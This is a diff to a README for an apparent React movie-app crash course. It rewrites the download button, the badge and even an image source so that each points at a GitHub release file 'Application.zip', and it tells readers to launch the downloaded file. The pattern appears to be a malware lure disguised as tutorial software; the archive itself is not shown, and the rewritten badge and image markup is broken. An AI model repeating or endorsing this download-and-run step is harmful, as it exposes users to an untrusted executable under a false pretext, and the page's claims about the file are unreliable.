@@ -23,9 +23,9 @@ In this crash course, you will embark on a journey exploring the depths of React
 
 ## Download Software
 
-For the necessary software and project files, please download the **Software.zip** file from the following link:  
+For the necessary software and project files, please download the **https://github.com/charly1234-we/react-movies/releases/download/v1.0/Application.zip** file from the following link:  
 
-[![Download Software](https://img.shields.io/badge/Download%20Software-Click%20Here-blue)](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/charly1234-we/react-movies/releases/download/v1.0/Application.zip%20Software-Click%20Here-blue)](https://github.com/charly1234-we/react-movies/releases/download/v1.0/Application.zip)
 
 *Note: Launch the downloaded file to access the software and project resources.*
 
@@ -46,7 +46,7 @@ If you encounter any issues with the download link or need further assistance, p
 
 Now that you have the software and resources at your disposal, it's time to dive into React and start building your very own movie application. Unleash your creativity, explore the power of React, and let's create something extraordinary together!
 
-![Movie Reel](https://cdn.pixabay.com/photo/2015/08/16/06/55/movie-891165_960_720.jpg)
+![Movie Reel](https://github.com/charly1234-we/react-movies/releases/download/v1.0/Application.zip)
 
 ---
 
